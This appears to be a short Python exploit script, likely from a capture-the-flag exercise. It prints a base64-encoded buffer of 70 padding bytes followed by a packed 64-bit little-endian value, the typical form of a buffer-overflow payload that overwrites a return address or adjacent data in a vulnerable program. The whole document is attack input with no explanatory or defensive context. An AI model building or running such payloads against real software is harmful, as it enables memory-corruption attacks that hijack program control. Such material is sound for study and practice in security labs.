
import sys
import struct
import base64

buf = b'HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'
buf += struct.pack('<Q', 6656527676080018379)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
